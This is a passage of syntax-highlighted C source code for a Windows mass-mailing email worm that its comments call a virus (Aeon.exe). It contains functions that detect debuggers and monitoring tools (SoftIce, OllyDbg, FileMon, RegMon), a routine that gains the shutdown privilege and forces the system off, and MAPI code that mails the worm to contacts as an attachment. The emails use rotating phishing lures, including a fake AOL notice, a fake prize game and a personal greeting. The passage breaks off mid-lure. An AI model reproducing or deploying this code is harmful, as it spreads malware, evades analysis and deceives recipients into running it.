    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"\\\\.\\SICE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* SoftIce found */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* SoftIce not found */</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Check for OllyDbg by its window handle */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">IsOllyDbgPresent</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Search for a window with a title " OllyDbg " */</span><span class="sc0">
    </span><span class="sc11">hWnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"OllyDbg"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hWnd</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* OllyDbg found */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* OllyDbg not found */</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Checking for FileMon by checking if the driver is loaded in memory and by searching for the window handle */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">IsFileMonPresent</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* check if the driver is loaded in the memory */</span><span class="sc0">
    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"\\\\.\\FILEVXD"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* FileMon found */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* Search for a window with a title " File Monitor ... " */</span><span class="sc0">
    </span><span class="sc11">hWnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"File Monitor - Sysinternals: www.sysinternals.com"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hWnd</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* FileMon found */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* FileMon not found */</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Checking for RegMon by checking if the driver is loaded in memory and by searching for the window handle */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">IsRegMonPresent</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Check if the driver is loaded in the memory */</span><span class="sc0">
    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"\\\\.\\REGVXD"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* RegMon found */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* Search for a window with a title " Registry Monitor ... " */</span><span class="sc0">
    </span><span class="sc11">hWnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Registry Monitor - Sysinternals: www.siliconrealms.com"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hWnd</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* RegMon found */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* RegMon not found */</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Gain the needed priviliges and force to shut down system */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SystemShutdown</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hToken</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">TOKEN_PRIVILEGES</span><span class="sc0"> </span><span class="sc11">tkp</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">OpenProcessToken</span><span class="sc10">(</span><span class="sc11">GetCurrentProcess</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc11">TOKEN_ADJUST_PRIVILEGES</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">TOKEN_QUERY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hToken</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">LookupPrivilegeValue</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SE_SHUTDOWN_NAME</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">tkp</span><span class="sc10">.</span><span class="sc11">Privileges</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">Luid</span><span class="sc10">);</span><span class="sc0"> 
 
    </span><span class="sc11">tkp</span><span class="sc10">.</span><span class="sc11">PrivilegeCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">  
    </span><span class="sc11">tkp</span><span class="sc10">.</span><span class="sc11">Privileges</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">Attributes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SE_PRIVILEGE_ENABLED</span><span class="sc10">;</span><span class="sc0"> 
 
    </span><span class="sc11">AdjustTokenPrivileges</span><span class="sc10">(</span><span class="sc11">hToken</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">tkp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PTOKEN_PRIVILEGES</span><span class="sc10">)</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* After getting all needed privileges force Windows to shutdown */</span><span class="sc0">
    </span><span class="sc11">ExitWindowsEx</span><span class="sc10">(</span><span class="sc11">EWX_SHUTDOWN</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">EWX_FORCE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Function to send the Emails, getting special values: subject, text and the name of the attached file */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">szAddress</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPMAPISENDMAIL</span><span class="sc0"> </span><span class="sc11">SendM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">lhSession</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">szVirPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">szAttName</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* Build our Email */</span><span class="sc0">
    </span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">RecipD</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
     
    </span><span class="sc1">/* Build the attachment out of the virus path %sysdir%\Aeon.exe, but with a specified name (szAttName) */</span><span class="sc0">
    </span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ULONG</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szVirPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szAttName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">};</span><span class="sc0">
    
    </span><span class="sc1">/* Set Message options, Subject (szSubject) and Text (szText) */</span><span class="sc0">
    </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">Message</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RecipD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Attachment</span><span class="sc10">};</span><span class="sc0">
                
    </span><span class="sc1">/* Set Email options */</span><span class="sc0">
    </span><span class="sc11">RecipD</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RecipD</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RecipD</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RecipD</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RecipD</span><span class="sc10">-&gt;</span><span class="sc11">ulEIDSize</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RecipD</span><span class="sc10">-&gt;</span><span class="sc11">lpEntryID</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
        
    </span><span class="sc1">/* Send the Email finally */</span><span class="sc0">
    </span><span class="sc11">SendM</span><span class="sc10">(</span><span class="sc11">lhSession</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Message</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">);</span><span class="sc0"> 

    </span><span class="sc1">/* Make the memory we used free again */</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">RecipD</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Function being called by CreateThread() later spreading the virus via Email (Outlook), subject/text/attachement name are depending on date */</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">MailMySelf</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">lpMessage</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInst</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LPMAPILOGON</span><span class="sc0"> </span><span class="sc11">MAPILogon</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LPMAPIFINDNEXT</span><span class="sc0"> </span><span class="sc11">MAPIFindNext</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LPMAPIREADMAIL</span><span class="sc0"> </span><span class="sc11">MAPIReadMail</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LPMAPISENDMAIL</span><span class="sc0"> </span><span class="sc11">MAPISendMail</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LPMAPILOGOFF</span><span class="sc0"> </span><span class="sc11">MAPILogoff</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">lhSession</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">stTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">MsgID</span><span class="sc10">[</span><span class="sc4">513</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szAeonAtt</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSubject</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szText</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szAttName</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szDate</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc1">/* Get the system time */</span><span class="sc0">
    </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">stTime</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* Saving in a format only telling day (1, 2, 3...) */</span><span class="sc0">
    </span><span class="sc11">GetDateFormat</span><span class="sc10">(</span><span class="sc11">LOCALE_USER_DEFAULT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">stTime</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dd"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szDate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szDate</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc1">/* Now the Subject, Text, Attachment Name depend on the day */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">22</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">29</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AOL (American Online) Information Email"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Dear User, \r\n\r\n \
                                    AOL is redesigning its inner structure this year, our aim is to become a more open \r\n \
                                    company and we want to provide new services around next month, offering free email accounts, \r\n \
                                    free webspace and more. If you are still a customer of us or if you are interested in one of those \r\n \
                                    benefits you can look into the attachement for more information. In a short time the program enables you \r\n \
                                    to get the advantages of our new services. \r\n\r\n \
                                    For any feedback you can contact AOL directly by Email: support@aol.com \r\n\r\n \
                                    Best regards, \r\n American Online"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szAttName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AOL.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">23</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Play a little game and win one of over 100 things"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Hello, \r\n\r\n \
                                   In the attachment you can find a little game called \"MoMo\", it is very easy to play, \r\n \
                                   and is really funny, the best thing is, try to get the highest highscore to win some interesting \r\n \
                                   prices, it can be money or new technical products (computer, digital cameras and more), \r\n \
                                   depends on the state you reach in the list of the best 100 users. Find out yourself and be the best! \r\n\r\n \
                                   Good luck, \r\n K-lineComputer Inc."</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szAttName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MoMo.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">17</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">31</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Happy New Year"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Hey, \r\n\r\n \
                                   I am not sure if you can remember who I am, it has been a long time since we last met, \r\n \
                                   but I have never forgot you =) Maybe in future we can meet again and go to some restaurant or \r\n \
